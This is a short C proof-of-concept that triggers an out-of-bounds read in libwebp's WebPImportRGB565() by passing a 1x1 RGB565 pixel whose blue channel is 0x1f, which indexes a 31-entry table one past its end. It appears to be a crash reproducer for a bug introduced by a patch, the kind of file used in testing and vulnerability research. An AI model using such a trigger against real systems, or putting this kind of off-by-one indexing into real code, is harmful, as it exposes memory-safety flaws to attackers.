// PoC for the out-of-bounds read introduced in WebPImportRGB565()'s blue
// channel expansion table (extras/extras.c).
//
// WebPImportRGB565() is a public helper declared in webp/../extras/extras.h
// (WEBP_EXTERN int WebPImportRGB565(const uint8_t*, WebPPicture*)). It
// consumes a tightly packed RGB565 buffer (2 bytes per pixel, width*height*2
// bytes total -- there is no separate stride parameter) and imports it into
// a WebPPicture.
//
// A 1x1 RGB565 image whose pixel has its low 5 bits (the blue channel) all
// set (0x1f) makes the patched code index a 31-entry lookup table with 31,
// one past its end.
#include <stdint.h>
#include <stdlib.h>

#include "extras/extras.h"
#include "webp/encode.h"

int main(void) {
  WebPPicture pic;
  // Blue = 0b11111 (5 bits), red = green = 0, matches the RGB565 in-contract
  // packed format consumed by WebPImportRGB565: byte0 = RRRRRGGG,
  // byte1 = GGGBBBBB.
  uint8_t rgb565[2] = {0x00, 0x1f};

  if (!WebPPictureInit(&pic)) {
    return 1;
  }
  pic.width = 1;
  pic.height = 1;

  if (!WebPImportRGB565(rgb565, &pic)) {
    return 1;
  }

  WebPPictureFree(&pic);
  return 0;
}
